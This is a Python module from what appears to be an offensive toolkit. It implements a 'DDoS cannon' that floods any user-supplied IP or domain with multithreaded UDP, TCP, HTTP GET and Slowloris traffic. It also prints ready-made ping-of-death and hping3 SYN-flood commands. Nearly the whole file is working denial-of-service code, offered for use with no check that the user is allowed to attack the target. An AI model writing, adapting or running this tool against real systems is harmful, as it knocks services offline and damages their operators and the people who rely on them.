#!/usr/bin/env python3
import sys, os, socket, threading, time, random
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

class DDoSTool:
    def __init__(self, target, port, threads=500, duration=60):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.packets = 0
        self.lock = threading.Lock()
        self.running = True
    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        start = time.time()
        while self.running and time.time() - start < self.duration:
            try:
                sock.sendto(payload, (self.target, self.port))
                with self.lock:
                    self.packets += 1
            except:
                pass
        sock.close()
    def tcp_flood(self):
        start = time.time()
        while self.running and time.time() - start < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, self.port))
                sock.send(random._urandom(1024))
                with self.lock:
                    self.packets += 1
                sock.close()
            except:
                pass
    def http_flood(self):
        start = time.time()
        while self.running and time.time() - start < self.duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.port))
                req = "GET /" + str(random.randint(1, 999999)) + " HTTP/1.1\r\n"
                req += "Host: " + self.target + "\r\n"
                req += "User-Agent: Mozilla/5.0\r\n"
                req += "Connection: keep-alive\r\n\r\n"
                sock.send(req.encode())
                with self.lock:
                    self.packets += 1
                sock.close()
            except:
                pass
    def slowloris(self):
        start = time.time()
        sockets = []
        while self.running and time.time() - start < self.duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))
                s.send(("GET /?" + str(random.randint(1, 9999)) + " HTTP/1.1\r\n").encode())
                s.send(("Host: " + self.target + "\r\n").encode())
                s.send("User-Agent: Mozilla/5.0\r\n".encode())
                sockets.append(s)
                if len(sockets) > 200:
                    for s in sockets[:]:
                        try:
                            s.send("X-a: keep-alive\r\n".encode())
                        except:
                            sockets.remove(s)
                    time.sleep(15)
            except:
                pass
    def run(self, method="udp"):
        print("[DDOS] Target: " + self.target + ":" + str(self.port))
        print("[DDOS] Threads: " + str(self.threads) + " | Duration: " + str(self.duration) + "s")
        print("[DDOS] Method: " + method.upper())
        print("[DDOS] FIRING CANNON...\n")
        thread_list = []
        for _ in range(self.threads):
            if method == "udp":
                t = threading.Thread(target=self.udp_flood)
            elif method == "tcp":
                t = threading.Thread(target=self.tcp_flood)
            elif method == "http":
                t = threading.Thread(target=self.http_flood)
            elif method == "slowloris":
                t = threading.Thread(target=self.slowloris)
            else:
                t = threading.Thread(target=self.udp_flood)
            t.daemon = True
            thread_list.append(t)
            t.start()
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n[DDOS] Interrupted.")
        self.running = False
        for t in thread_list:
            t.join(timeout=1)
        print("\n[DDOS] CANNON CEASED.")
        print("[DDOS] Total packets: " + str(self.packets))
        print("[DDOS] Rate: ~" + str(int(self.packets / self.duration)) + " packets/sec")

@auth_required
def run_dos():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║         DOS / DDOS CANNON MODULE                      ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] UDP Flood")
    print("[2] TCP Flood")
    print("[3] HTTP Flood")
    print("[4] Slowloris")
    print("[5] Ping of Death")
    print("[6] SYN Flood")
    choice = input("\n[DDOS] Select: ").strip()
    target = input("[DDOS] Target IP/Domain: ").strip()
    port = int(input("[DDOS] Port (default 80): ").strip() or "80")
    threads = int(input("[DDOS] Threads (default 500): ").strip() or "500")
    duration = int(input("[DDOS] Duration seconds (default 60): ").strip() or "60")
    methods = {"1": "udp", "2": "tcp", "3": "http", "4": "slowloris"}
    method = methods.get(choice, "udp")
    if choice == "5":
        print("[DDOS] ping -s 65507 " + target)
        log_action("DDOS", "Ping of Death on " + target)
        return
    if choice == "6":
        print("[DDOS] hping3 -S -p " + str(port) + " --flood " + target)
        log_action("DDOS", "SYN flood on " + target + ":" + str(port))
        return
    cannon = DDoSTool(target, port, threads, duration)
    cannon.run(method)
    log_action("DDOS", method.upper() + " on " + target + ":" + str(port))
